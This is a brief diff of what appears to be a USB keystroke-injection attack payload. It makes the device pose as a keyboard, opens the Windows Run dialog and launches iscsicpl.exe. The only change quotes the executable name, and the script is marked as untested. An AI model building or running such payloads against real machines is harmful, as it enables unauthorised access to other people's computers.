@@ -3,7 +3,7 @@ REM Currently untested
 ATTACKMODE HID
 LED R
 GUI R
-STRING iscsicpl.exe
+STRING "iscsicpl.exe"
 ENTER
 DELAY 1000
 CTRL TAB
